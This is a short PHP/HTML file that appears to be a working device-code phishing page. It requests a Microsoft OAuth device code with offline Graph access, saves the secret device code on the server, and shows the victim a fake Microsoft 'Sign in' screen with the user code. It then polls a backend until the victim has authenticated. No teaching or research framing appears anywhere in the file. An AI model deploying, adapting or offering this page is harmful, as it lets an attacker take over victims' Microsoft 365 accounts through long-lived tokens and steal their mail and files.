<?php
$client_id = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
$scope     = 'https://graph.microsoft.com/.default offline_access';

$ch = curl_init('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query([
        'client_id' => $client_id,
        'scope'     => $scope
    ])
]);
$resp = json_decode(curl_exec($ch), true);
curl_close($ch);

$user_code        = $resp['user_code'] ?? '';
$device_code      = $resp['device_code'] ?? '';
$verification_uri = $resp['verification_uri'] ?? 'https://microsoft.com/devicelogin';

file_put_contents('device_'.md5($user_code).'.txt', $device_code);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to your account</title>
<style>
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,.15);width:440px;max-width:95vw;padding:44px}
.logo{width:108px;margin-bottom:24px}
h1{font-size:24px;font-weight:600;margin:0 0 12px}
p{color:#1b1b1b;font-size:15px;line-height:1.4}
.code{font-size:28px;font-weight:700;letter-spacing:2px;background:#f2f2f2;padding:12px 20px;border-radius:4px;display:inline-block;margin:20px 0}
.btn{background:#0067b8;color:#fff;border:none;padding:12px 24px;font-size:15px;border-radius:2px;cursor:pointer;text-decoration:none;display:inline-block}
.btn:hover{background:#005da6}
small{color:#666;font-size:13px}
</style>
</head>
<body>
<div class="card">
<img class="logo" src="https://img.icons8.com/color/96/microsoft.png" alt="Microsoft">
<h1>Sign in</h1>
<p>To continue, enter the code below at</p>
<p><strong><?= htmlspecialchars($verification_uri) ?></strong></p>
<div class="code"><?= htmlspecialchars($user_code) ?></div>
<p><a class="btn" href="<?= htmlspecialchars($verification_uri) ?>" target="_blank">Open Microsoft login</a></p>
<small>This code expires in 15 minutes.</small>
</div>
<script>
const userCode = '<?= $user_code ?>';
setInterval(() => {
  fetch('poll.php?code=' + encodeURIComponent(userCode))
    .then(r => r.text())
    .then(t => {
      if(t === 'ok'){
        document.body.innerHTML = '<div style="text-align:center;padding:80px 20px;font-family:Segoe UI"><h2>Success</h2><p>You can close this window.</p></div>';
      }
    });
}, 5000);
</script>
</body>
</html>
